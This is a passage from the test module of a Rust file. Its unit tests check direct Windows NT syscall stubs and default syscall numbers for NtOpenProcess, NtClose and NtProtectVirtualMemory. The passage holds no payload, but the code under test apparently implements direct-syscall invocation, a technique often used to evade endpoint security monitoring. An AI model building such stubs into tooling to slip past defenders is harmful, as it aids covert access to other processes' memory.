        }
    }

    #[test]
    fn test_dynamic_syscall_stub_lifetime() {
        // Ensure that the stub can be created and dropped without panic
        #[cfg(not(target_os = "windows"))]
        {
            let stub = DynamicSyscallStub::new(0x26);
            drop(stub);
        }
    }

    #[test]
    fn test_syscall_numbers_from_map_empty() {
        let map = HashMap::new();
        let nums = SyscallNumbers::from_map(&map);
        // All should fall back to defaults
        assert_eq!(nums.nt_open_process, 0x26);
        assert_eq!(nums.nt_close, 0x0F);
        assert_eq!(nums.nt_protect_virtual_memory, 0x50);
    }

    #[test]
    fn test_syscall_numbers_debug() {
        let nums = SyscallNumbers::default();
        let debug = format!("{:?}", nums);
        assert!(debug.contains("nt_open_process"));
        assert!(debug.contains("nt_close"));
    }

    #[test]
    fn test_syscall_status_clone_copy() {
        let s1 = SyscallStatus(0);
        let s2 = s1;
        assert_eq!(s1, s2);
    }

    #[test]
    fn test_non_windows_syscall_stubs_return_error() {
        #[cfg(not(target_os = "windows"))]
        unsafe {
            let r = syscall_0(0x26);
            assert!(r.is_error());
            let r = syscall_1(0x26, std::ptr::null());
            assert!(r.is_error());
            let r = syscall_2(0x26, std::ptr::null(), std::ptr::null());
            assert!(r.is_error());
            let r = syscall_3(0x26, std::ptr::null(), std::ptr::null(), std::ptr::null());
            assert!(r.is_error());
            let r = syscall_4(
                0x26,
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
            );
            assert!(r.is_error());
        }
    }
}
